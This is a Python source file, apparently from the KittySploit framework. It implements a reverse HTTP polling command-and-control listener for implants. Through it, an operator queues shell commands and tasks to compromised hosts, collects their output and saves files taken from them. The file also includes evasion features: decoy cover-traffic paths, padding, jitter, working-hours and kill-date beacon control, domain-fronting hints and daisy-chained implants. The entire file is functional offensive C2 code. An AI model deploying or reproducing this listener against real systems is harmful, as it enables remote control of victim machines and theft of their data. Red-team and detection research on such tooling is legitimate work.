#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import json
import random
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlparse

from kittysploit import *

from lib.c2.beacon_profile import BeaconProfile
from lib.c2.beacon_timing import pad_response
from lib.c2.ops_log import get_ops_log


class Module(Listener):
    __info__ = {
        "name": "Reverse HTTP Polling Listener",
        "description": (
            "HTTP polling C2 with beacon profiles, daisy-chain hops, "
            "cover-traffic decoys, and implant identity verification."
        ),
        "author": "KittySploit Team",
        "version": "2.2.0",
        "handler": Handler.REVERSE,
        "session_type": "polling",
        "protocol": "http_polling",
    }

    lhost = OptString("0.0.0.0", "Listen address", True)
    lport = OptPort(8088, "Listen port", True)
    url_prefix = OptString("/c2", "URL prefix", False)
    poll_interval = OptInteger(10, "Suggested base poll interval (seconds)", False, True)
    jitter_percent = OptInteger(35, "Jitter percent sent to agents", False, True)
    kill_date = OptString("", "Kill date ISO (YYYY-MM-DD); empty=never", False, True)
    working_hours = OptString("", "Active window HH:MM-HH:MM; empty=always", False, True)
    timezone = OptString("UTC", "Timezone for kill date / working hours", False, True)
    sleep_outside_hours = OptInteger(3600, "Sleep seconds when outside working hours", False, True)
    user_agent = OptString("Mozilla/5.0", "User-Agent hint echoed to agents", False, True)
    host_header = OptString(
        "",
        "Domain-front Host header hint for redirector generate (toward origin)",
        False,
        True,
    )
    payload_comms_host = OptString(
        "",
        "CDN/front hostname hint for redirector generate (implant connect host)",
        False,
        True,
    )
    cover_traffic = OptBool(True, "Serve decoy HTTP paths for cover traffic", False, True)
    response_pad_min = OptInteger(0, "Minimum JSON response size (0=off)", False, True)
    stale_timeout = OptInteger(180, "Alert when agent silent for N seconds (0=off)", False, True)
    alert_on_stale = OptBool(True, "Alert on stale polling agents", False, True)
    implant_public_key = OptString("", "Expected implant Ed25519 public key PEM (from payload build)", False, True)
    allow_chained = OptBool(True, "Accept daisy-chained implants (X-KS-Chain-Token/Via)", False, True)
    chain_token = OptString("", "Expected chain token (empty=do not validate token)", False, True)
    callback_notify_url = OptString(
        "",
        "Optional webhook URL POSTed as JSON on new implant check-in",
        False,
        True,
    )

    def __init__(self, framework=None):
        super().__init__(framework)
        self.httpd = None
        self.running = False
        self._pending_commands = {}
        self._received_output = {}
        self._client_id_to_session = {}
        self._session_to_client_id = {}
        self._last_seen = {}
        self._stale_alerted = set()
        self._session_profiles = {}
        self._killed_sessions = set()
        self._in_flight_tasks = {}  # session_id -> [task_id, ...] awaiting /result
        self._decoy_paths = ["/", "/favicon.ico", "/robots.txt", "/health", "/api/status", "/login"]

    def _ops(self):
        return get_ops_log(self.framework)

    def _opt_str(self, name: str, default: str = "") -> str:
        attr = getattr(self, name, default)
        if hasattr(attr, "value"):
            return str(getattr(attr, "value") or default)
        return str(attr if attr is not None else default)

    def _opt_bool(self, name: str, default: bool = False) -> bool:
        attr = getattr(self, name, default)
        if hasattr(attr, "value"):
            return bool(getattr(attr, "value"))
        return bool(attr)

    def _notify_new_implant(self, client_id: str, client_ip: str, session_id: str, chained: bool, chain_via: str):
        url = self._opt_str("callback_notify_url", "").strip()
        if not url:
            return
        payload = {
            "event": "implant_checkin",
            "implant_id": client_id,
            "client_ip": client_ip,
            "session_id": session_id,
            "chained": bool(chained),
            "chain_via": chain_via or "",
            "listener": "reverse_http_polling",
        }
        try:
            import json as _json
            import urllib.request as _urlreq

            data = _json.dumps(payload).encode("utf-8")
            req = _urlreq.Request(
                url,
                data=data,
                method="POST",
                headers={"Content-Type": "application/json", "User-Agent": "KittySploit-C2/1"},
            )
            threading.Thread(
                target=lambda: _urlreq.urlopen(req, timeout=5).read(),
                daemon=True,
            ).start()
        except Exception:
            pass

    def _check_chain_headers(self, headers) -> tuple:
        """Return (ok, chained, token, via)."""
        from lib.c2.chain import CHAIN_TOKEN_HEADER, CHAIN_VIA_HEADER, validate_chain_token

        token = ""
        via = ""
        try:
            token = str(headers.get(CHAIN_TOKEN_HEADER) or headers.get(CHAIN_TOKEN_HEADER.lower()) or "")
            via = str(headers.get(CHAIN_VIA_HEADER) or headers.get(CHAIN_VIA_HEADER.lower()) or "")
        except Exception:
            pass
        chained = bool(token or via)
        if chained and not self._opt_bool("allow_chained", True):
            return False, True, token, via
        expected = self._opt_str("chain_token", "").strip()
        if chained and expected and not validate_chain_token(token, expected):
            return False, True, token, via
        return True, chained, token, via

    def _base_profile(self) -> BeaconProfile:
        return BeaconProfile.from_opts(self, decoy_paths=self._decoy_paths)

    def _profile_for(self, session_id: str = "") -> BeaconProfile:
        base = self._base_profile()
        if not session_id:
            return base
        overrides = self._session_profiles.get(session_id) or {}
        if not overrides:
            return base
        return base.with_overrides(**overrides)

    def set_session_profile(self, session_id: str, **overrides):
        """Overlay beacon settings for one session (sleep, kill_date, hours, …)."""
        current = dict(self._session_profiles.get(session_id) or {})
        for key, value in overrides.items():
            if value is None:
                current.pop(key, None)
            else:
                current[key] = value
        if current:
            self._session_profiles[session_id] = current
        else:
            self._session_profiles.pop(session_id, None)

    def _verify_client(self, client_id: str, sig_b64: str) -> bool:
        pub = str(getattr(getattr(self, "implant_public_key", None), "value", self.implant_public_key) or "").strip()
        if not pub:
            pub = str(getattr(self, "session_implant_public_key", "") or "").strip()
        if not pub or not sig_b64:
            return not pub
        try:
            pad = "=" * (-len(sig_b64) % 4)
            sig = base64.urlsafe_b64decode(sig_b64 + pad)
            from cryptography.hazmat.primitives import serialization
            from cryptography.hazmat.primitives.asymmetric import ed25519

            key = serialization.load_pem_public_key(pub.encode())
            if not isinstance(key, ed25519.Ed25519PublicKey):
                return False
            key.verify(sig, client_id.encode("utf-8"))
            return True
        except Exception:
            return False

    def _ensure_session(self, client_id, client_ip, sig: str = "", *, chained: bool = False, chain_via: str = ""):
        pub = str(getattr(getattr(self, "implant_public_key", None), "value", self.implant_public_key) or "").strip()
        if not pub:
            pub = str(getattr(self, "session_implant_public_key", "") or "").strip()
        if pub and not self._verify_client(client_id, sig):
            return None

        if client_id in self._client_id_to_session:
            sid = self._client_id_to_session[client_id]
            self._last_seen[sid] = time.time()
            return sid

        data = {
            "protocol": "http_polling",
            "client_id": client_id,
            "implant_id": client_id,
            "client_ip": client_ip,
            "handler": "reverse",
            "session_type": "polling",
            "listener_type": "reverse_http_polling",
            "pty_mode": False,
            "chained": bool(chained),
            "chain_via": str(chain_via or ""),
        }
        sid = self._create_session("reverse", client_ip, 0, data)
        if sid:
            self._client_id_to_session[client_id] = sid
            self._session_to_client_id[sid] = client_id
            self._pending_commands[sid] = []
            self._in_flight_tasks[sid] = []
            self._received_output[sid] = []
            self._last_seen[sid] = time.time()
            chain_note = f" via={chain_via}" if chained else ""
            print_success(f"HTTP polling agent {client_id} ({client_ip}) -> session {sid}{chain_note}")
            self._notify_new_implant(client_id, client_ip, sid, chained, chain_via)
        return sid

    def _encode_poll_body(self, payload: dict) -> str:
        body = json.dumps(payload)
        pad = int(getattr(getattr(self, "response_pad_min", None), "value", self.response_pad_min) or 0)
        if pad > 0:
            body = pad_response(body, pad)
        return body

    def _normalize_queue_item(self, item):
        """Accept legacy strings, shell dicts, or typed AgentTask dicts."""
        if isinstance(item, dict):
            if item.get("task") and isinstance(item["task"], dict):
                return {
                    "task_id": str(item.get("task_id") or item["task"].get("task_id") or ""),
                    "command": "",
                    "task": item["task"],
                    "encoding": "task",
                }
            if item.get("encoding") == "task" or (
                item.get("command") and str(item.get("command")).startswith("{")
            ):
                return {
                    "task_id": str(item.get("task_id") or ""),
                    "command": str(item.get("command") or ""),
                    "task": item.get("task"),
                    "encoding": "task",
                }
            return {
                "task_id": str(item.get("task_id") or ""),
                "command": str(item.get("command") or ""),
                "task": None,
                "encoding": "base64",
            }
        return {"task_id": "", "command": str(item or ""), "task": None, "encoding": "base64"}

    def _build_poll_response(self, session_id: str) -> str:
        """Assemble /poll JSON honouring kill date and working hours."""
        profile = self._profile_for(session_id)

        if profile.is_past_kill_date() or session_id in self._killed_sessions:
            self._killed_sessions.add(session_id)
            for item in list(self._pending_commands.get(session_id) or []):
                tid = self._normalize_queue_item(item).get("task_id")
                if tid:
                    try:
                        self._ops().mark_killed(tid)
                    except Exception:
                        pass
            self._pending_commands[session_id] = []
            payload = profile.to_poll_dict(die=True)
            return self._encode_poll_body(payload)

        if not profile.is_within_working_hours():
            payload = profile.to_poll_dict(outside_hours=True)
            return self._encode_poll_body(payload)

        queue = self._pending_commands.get(session_id, [])
        item = self._normalize_queue_item(queue.pop(0)) if queue else None
        payload = profile.to_poll_dict(command="")
        if item:
            tid = item.get("task_id") or ""
            if item.get("encoding") == "task" and item.get("task"):
                task = item["task"]
                payload["encoding"] = "task"
                payload["task"] = task
                payload["command"] = json.dumps(task, ensure_ascii=False)
            elif item.get("encoding") == "task" and item.get("command"):
                payload["encoding"] = "task"
                payload["command"] = item["command"]
                try:
                    payload["task"] = json.loads(item["command"])
                except Exception:
                    payload["task"] = {"command": "shell", "args": {"cmd": item["command"]}, "task_id": tid}
            else:
                cmd = item.get("command") or ""
                if cmd:
                    payload["command"] = base64.b64encode(cmd.encode()).decode()
                    payload["encoding"] = "base64"
            if tid:
                try:
                    self._ops().mark_sent(tid)
                except Exception:
                    pass
                self._in_flight_tasks.setdefault(session_id, []).append(tid)
        return self._encode_poll_body(payload)

    def _stale_watch_loop(self):
        timeout = int(self.stale_timeout or 0)
        if timeout <= 0:
            return
        while self.running:
            time.sleep(max(5, timeout // 4))
            now = time.time()
            for sid, last in list(self._last_seen.items()):
                if now - last < timeout:
                    continue
                if sid in self._stale_alerted:
                    continue
                self._stale_alerted.add(sid)
                if not bool(self.alert_on_stale):
                    continue
                cid = self._session_to_client_id.get(sid, sid[:8])
                print_warning(f"HTTP polling agent stale: {cid} (no poll for {timeout}s)")
                if self.framework and hasattr(self.framework, "notify_session_disconnected"):
                    self.framework.notify_session_disconnected(
                        sid,
                        reason=f"stale>{timeout}s",
                        label=str(cid),
                    )

    def _handler_class(self):
        listener = self
        prefix = "/" + str(self.url_prefix or "/c2").strip("/")

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                return

            def _send(self, status, body, ctype="text/plain"):
                data = body.encode("utf-8") if isinstance(body, str) else body
                self.send_response(status)
                self.send_header("Content-Type", ctype)
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def do_GET(self):
                parsed = urlparse(self.path)
                path = parsed.path

                if listener.cover_traffic and path in listener._decoy_paths:
                    decoys = ["OK", "healthy", "200", "<!-- static -->"]
                    self._send(200, random.choice(decoys))
                    return

                if path != f"{prefix}/poll":
                    self._send(404, "not found")
                    return

                qs = parse_qs(parsed.query)
                cid = (qs.get("id") or [""])[0]
                sig = (qs.get("sig") or [""])[0]
                if not cid:
                    self._send(400, "missing id")
                    return
                ok_chain, chained, _tok, via = listener._check_chain_headers(self.headers)
                if not ok_chain:
                    self._send(403, "chain not allowed")
                    return
                sid = listener._ensure_session(
                    cid, self.client_address[0], sig=sig, chained=chained, chain_via=via
                )
                if not sid:
                    self._send(403, "invalid implant signature")
                    return
                body = listener._build_poll_response(sid)
                self._send(200, body, "application/json")

            def do_POST(self):
                parsed = urlparse(self.path)
                if parsed.path != f"{prefix}/result":
                    self._send(404, "not found")
                    return
                length = int(self.headers.get("Content-Length", "0") or 0)
                raw = self.rfile.read(length).decode("utf-8", errors="replace")
                qs = parse_qs(parsed.query)
                cid = (qs.get("id") or [""])[0]
                sig = (qs.get("sig") or [""])[0]
                if not cid:
                    self._send(400, "missing id")
                    return
                ok_chain, chained, _tok, via = listener._check_chain_headers(self.headers)
                if not ok_chain:
                    self._send(403, "chain not allowed")
                    return
                sid = listener._ensure_session(
                    cid, self.client_address[0], sig=sig, chained=chained, chain_via=via
                )
                if not sid:
                    self._send(403, "invalid implant signature")
                    return
                try:
                    data = json.loads(raw) if raw else {}
                    output = data.get("output", "")
                    if data.get("encoding") == "base64":
                        output = base64.b64decode(output).decode("utf-8", errors="replace")
                except Exception:
                    output = raw
                    data = {}
                listener._append_output(sid, output)
                # Persist downloaded files from typed agent
                try:
                    files = data.get("files") if isinstance(data, dict) else None
                    if files:
                        listener._save_agent_files(sid, files)
                except Exception:
                    pass
                listener._complete_inflight_task(sid, output)
                self._send(200, "ok")

        return Handler

    def run(self, background=False):
        host = str(self.lhost or "0.0.0.0")
        port = int(self.lport or 8088)
        self.httpd = ThreadingHTTPServer((host, port), self._handler_class())
        self.running = True
        self.listener_thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        self.listener_thread.start()
        threading.Thread(target=self._stale_watch_loop, daemon=True).start()
        profile = self._base_profile()
        print_success(f"Reverse HTTP polling listener on http://{host}:{port}{self.url_prefix}")
        print_info("Agent: GET /c2/poll?id=<implant_id>&sig=<b64url>, POST /c2/result?id=<implant_id>&sig=...")
        if profile.kill_date:
            print_info(f"Beacon kill_date={profile.kill_date} tz={profile.timezone}")
        if profile.working_hours:
            print_info(
                f"Beacon working_hours={profile.working_hours} "
                f"tz={profile.timezone} outside_sleep={profile.sleep_outside_hours}s"
            )
        if self._opt_bool("allow_chained", True):
            tok = self._opt_str("chain_token", "")
            print_info(
                "Daisy-chain enabled"
                + (f" (token required)" if tok else " (token optional)")
            )
        notify = self._opt_str("callback_notify_url", "")
        if notify:
            print_info(f"Callback notify webhook: {notify}")
        if background:
            return True
        try:
            while self.running:
                time.sleep(0.2)
        except KeyboardInterrupt:
            self.shutdown()
        return True

    def set_pending_command(self, session_id, cmd, operator: str = "console"):
        if session_id in self._killed_sessions:
            return
        profile = self._profile_for(session_id)
        if profile.is_past_kill_date():
            self._killed_sessions.add(session_id)
            return
        implant_id = self._session_to_client_id.get(session_id, "")
        task_id = ""
        try:
            task_id = self._ops().log_queued(
                session_id=str(session_id),
                command=str(cmd),
                implant_id=str(implant_id),
                operator=str(operator or "console"),
                listener_type="reverse_http_polling",
            )
        except Exception:
            task_id = ""
        self._pending_commands.setdefault(session_id, []).append(
            {"task_id": task_id, "command": str(cmd)}
        )

    def set_pending_task(self, session_id, task, operator: str = "console"):
        """Queue a typed AgentTask (dict or AgentTask)."""
        from lib.c2.task_protocol import AgentTask

        if session_id in self._killed_sessions:
            return None
        profile = self._profile_for(session_id)
        if profile.is_past_kill_date():
            self._killed_sessions.add(session_id)
            return None
        if isinstance(task, AgentTask):
            task_obj = task
        elif isinstance(task, dict):
            task_obj = AgentTask.from_dict(task)
        else:
            return None
        if not task_obj:
            return None
        implant_id = self._session_to_client_id.get(session_id, "")
        try:
            logged = self._ops().log_queued(
                session_id=str(session_id),
                command=f"{task_obj.command} {json.dumps(task_obj.args)[:200]}",
                implant_id=str(implant_id),
                operator=str(operator or "console"),
                listener_type="reverse_http_polling",
                task_id=task_obj.task_id,
            )
            task_obj.task_id = logged or task_obj.task_id
        except Exception:
            pass
        self._pending_commands.setdefault(session_id, []).append(
            {
                "task_id": task_obj.task_id,
                "encoding": "task",
                "task": task_obj.to_dict(),
                "command": task_obj.to_wire(),
            }
        )
        return task_obj.task_id

    def _save_agent_files(self, session_id, files):
        import os
        from pathlib import Path

        out_dir = Path(os.path.expanduser("~/.kittysploit/agent_files")) / str(session_id)[:12]
        out_dir.mkdir(parents=True, exist_ok=True)
        for entry in files or []:
            if not isinstance(entry, dict):
                continue
            name = Path(str(entry.get("path") or "file.bin")).name
            data = entry.get("data") or ""
            try:
                blob = base64.b64decode(data) if entry.get("encoding") == "base64" else str(data).encode()
            except Exception:
                continue
            dest = out_dir / name
            dest.write_bytes(blob)
            print_success(f"Agent file saved: {dest} ({len(blob)} bytes)")

    def _complete_inflight_task(self, session_id, output: str):
        inflight = self._in_flight_tasks.get(session_id) or []
        if not inflight:
            return
        task_id = inflight.pop(0)
        try:
            self._ops().mark_completed(task_id, output=str(output or ""))
        except Exception:
            pass

    def _append_output(self, session_id, text):
        self._received_output.setdefault(session_id, []).append(text)
        self._received_output[session_id] = self._received_output[session_id][-500:]
        self._last_seen[session_id] = time.time()
        self._stale_alerted.discard(session_id)

    def get_output(self, session_id, clear=False):
        out = "\n".join(self._received_output.get(session_id, []))
        if clear:
            self._received_output[session_id] = []
        return out

    def get_output_lines(self, session_id, last_n=50):
        return self._received_output.get(session_id, [])[-last_n:]

    def shutdown(self):
        self.running = False
        if self.httpd:
            self.httpd.shutdown()
